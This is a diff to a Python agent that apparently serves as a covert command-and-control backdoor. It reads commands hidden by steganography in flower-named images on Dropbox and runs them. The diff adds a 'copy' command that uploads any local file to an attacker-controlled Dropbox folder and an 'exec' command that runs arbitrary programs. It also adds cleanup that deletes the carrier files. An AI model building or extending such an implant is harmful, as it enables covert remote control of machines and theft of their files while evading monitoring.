@@ -10,8 +10,8 @@ from stegano import lsb
 
 
 
-# Initialize a Dropbox object with your access token
-ACCESS_TOKEN = ''
+
+ACCESS_TOKEN = '<insert_your_access_token>'
 dbx = dropbox.Dropbox(ACCESS_TOKEN)
 
 LAST_FLOWER_ID = 0
@@ -43,19 +43,20 @@ def check_for_command():
                 upload_file("./PlumeriaSpecial.png", "/fruits/PlumeriaSpecial-from-" + str(get_id()) + "-" + str(file_number))
                 #clean up
                 os.remove("./PlumeriaSpecial.png")
+                os.remove(entry.name)
 
     except dropbox.exceptions.ApiError as e:
         print(f"Dropbox API Error: {e}")
 
 def reveal_secret(name):
-    return lsb.reveal("./PlumeriaSpecial1.png")
+    return lsb.reveal(name)
 
 def extract_number(file_name):
     match = re.search(r'\d+', file_name)
     return int(match.group()) if match else None
 
 def download_file(dropbox_path, local_name):
-    local_path = os.path.join('..', local_name)
+    local_path = os.path.join('.', local_name)
     try:
         dbx.files_download_to_file(local_path, dropbox_path)
         print(f"Downloaded '{local_name}' to '{local_path}'.")
@@ -66,14 +67,14 @@ def upload_file(file_path, dropbox_path):
     with open(file_path, "rb") as file:
         try:
             dbx.files_upload(file.read(), dropbox_path)
-            print(f"File '{file_path}' uploaded successfully.")
+            print(f"File '{dropbox_path}' uploaded successfully.")
         except ApiError as e:
             print(f"API error: {e}")
         except IOError as e:
             print(f"I/O error: {e}")
 
 def process_command(command):
-    if command == 'are_u_there':
+    if command == 'alive':
         return 'im_alive'
     elif command == 'w':
         try:
@@ -87,6 +88,17 @@ def process_command(command):
             return result.stdout
         except Exception as e:
             return f"An error occurred during whoami cmd: {e}"
+    elif 'copy' in command:
+        parts = command.split(' ')
+        upload_file(str(parts[1]), '/data/' + str(parts[1]))
+        return 'Data sent'
+    elif 'exec' in command:
+        parts = command.split(' ')
+        try:
+            result = subprocess.run([str(parts[1])], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            return result.stdout
+        except Exception as e:
+            return f"An error occurred during exec cmd: {e}"
     elif 'ls' in command:
         try:
             result = subprocess.run([str(command)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
@@ -109,7 +121,7 @@ def find_file_in_dropbox(folder_path):
     return None
 
 def is_target_file(file_name):
-    return re.match(r'id-\d+\.jpeg', file_name)
+    return re.match(r'id-\d+\.jpg', file_name)
 
 def delete_file(file_path):
     try:
@@ -120,7 +132,7 @@ def delete_file(file_path):
         return False
 
 def extract_id(file_name):
-    return re.search(r'id-(\d+)\.jpeg', file_name).group(1)
+    return re.search(r'id-(\d+)\.jpg', file_name).group(1)
 
 
 def register_id():
